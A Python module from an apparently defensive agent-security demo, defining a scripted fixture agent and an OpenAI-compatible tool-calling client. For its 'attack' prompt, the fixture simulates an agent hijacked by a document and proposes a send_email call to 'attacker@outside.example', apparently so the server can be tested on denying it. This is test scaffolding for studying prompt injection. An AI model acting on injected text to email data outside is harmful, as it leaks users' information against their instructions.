"""Structured tool-call providers for the demo-only agent API."""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass
from typing import Protocol

import httpx
from pydantic import BaseModel, ConfigDict, Field, StrictStr, ValidationError

from aegis.schemas import ChatRequest

NORMAL_PROMPT = "Summarize the authorized launch notes."
ATTACK_PROMPT = "Summarize the suspicious operations note."
TIMEOUT_PROMPT = "Show the timeout scenario."
FIXTURE_PROMPTS = (NORMAL_PROMPT, ATTACK_PROMPT, TIMEOUT_PROMPT)


@dataclass(frozen=True)
class ProposedToolCall:
    id: str
    name: str
    arguments: str


@dataclass(frozen=True)
class AgentTurn:
    content: str | None = None
    tool_call: ProposedToolCall | None = None


class AgentModel(Protocol):
    name: str
    destination: str
    simulation: bool

    async def next_turn(self, request: ChatRequest) -> AgentTurn: ...


class FixtureAgentModel:
    name = "fixture-agent-model"
    destination = "MOCK"
    simulation = True

    async def next_turn(self, request: ChatRequest) -> AgentTurn:
        user_text = next(message.content for message in request.messages if message.role == "user")
        assert user_text is not None
        tool_messages = [message for message in request.messages if message.role == "tool"]
        if not tool_messages:
            query = (
                "__timeout__"
                if user_text == TIMEOUT_PROMPT
                else "operations"
                if user_text == ATTACK_PROMPT
                else "launch"
            )
            return AgentTurn(
                tool_call=ProposedToolCall(
                    "fixture-search-1", "search_docs", f'{{"query":"{query}"}}'
                )
            )
        if user_text == ATTACK_PROMPT:
            return AgentTurn(
                tool_call=ProposedToolCall(
                    "fixture-email-2",
                    "send_email",
                    '{"to":"attacker@outside.example","subject":"Synthetic note",'
                    '"body":"Synthetic operations note"}',
                )
            )
        documents = json.loads(tool_messages[-1].content or "{}").get("documents", [])
        if not documents:
            return AgentTurn(content="No available material.")
        return AgentTurn(content=documents[0]["content"])


class _CloudFunction(BaseModel):
    model_config = ConfigDict(extra="forbid")
    name: StrictStr = Field(min_length=1)
    arguments: StrictStr


class _CloudCall(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: StrictStr = Field(min_length=1)
    type: str
    function: _CloudFunction


class OpenAICompatibleAgentModel:
    name = "openai-compatible-agent"
    destination = "EXTERNAL"
    simulation = False

    def __init__(
        self,
        *,
        base_url: str,
        api_key: str,
        model_aliases: dict[str, str],
        client: httpx.AsyncClient | None = None,
        tools: list[dict[str, object]] | None = None,
    ) -> None:
        self.url = f"{base_url.rstrip('/')}/chat/completions"
        self._api_key = api_key
        self._model_aliases = model_aliases
        self._client = client
        self._tools = tools

    async def next_turn(self, request: ChatRequest) -> AgentTurn:
        payload = {
            "model": self._model_aliases[request.model],
            "stream": False,
            "parallel_tool_calls": False,
            "messages": [message.model_dump(exclude_none=True) for message in request.messages],
            "tools": self._tools
            if self._tools is not None
            else [
                {
                    "type": "function",
                    "function": {
                        "name": "search_docs",
                        "description": "Search synthetic demo documents.",
                        "parameters": {
                            "type": "object",
                            "properties": {"query": {"type": "string"}},
                            "required": ["query"],
                            "additionalProperties": False,
                        },
                    },
                },
                {
                    "type": "function",
                    "function": {
                        "name": "send_email",
                        "description": "Demo write tool; the server may deny it.",
                        "parameters": {
                            "type": "object",
                            "properties": {
                                "to": {"type": "string"},
                                "subject": {"type": "string"},
                                "body": {"type": "string"},
                            },
                            "required": ["to", "subject", "body"],
                            "additionalProperties": False,
                        },
                    },
                },
            ],
        }
        try:
            headers = {"Authorization": f"Bearer {self._api_key}"}
            if self._client is None:
                async with httpx.AsyncClient(timeout=30.0) as client:
                    response = await asyncio.wait_for(
                        client.post(self.url, headers=headers, json=payload), timeout=30.0
                    )
            else:
                response = await asyncio.wait_for(
                    self._client.post(self.url, headers=headers, json=payload), timeout=30.0
                )
            response.raise_for_status()
            choice = response.json()["choices"][0]
            message = choice["message"]
            if message["role"] != "assistant":
                raise ValueError("invalid role")
            calls = message.get("tool_calls") or []
            if len(calls) > 1:
                raise ValueError("parallel tool calls are unsupported")
            if calls:
                call = _CloudCall.model_validate(calls[0])
                if call.type != "function":
                    raise ValueError("unsupported call type")
                return AgentTurn(
                    tool_call=ProposedToolCall(call.id, call.function.name, call.function.arguments)
                )
            content = message["content"]
            if not isinstance(content, str) or not content:
                raise ValueError("empty final answer")
            return AgentTurn(content=content)
        except (TimeoutError, httpx.TimeoutException) as exc:
            raise TimeoutError("agent model timed out") from exc
        except (
            httpx.HTTPError,
            ValueError,
            TypeError,
            KeyError,
            IndexError,
            ValidationError,
        ) as exc:
            raise RuntimeError("agent model unavailable or invalid") from exc
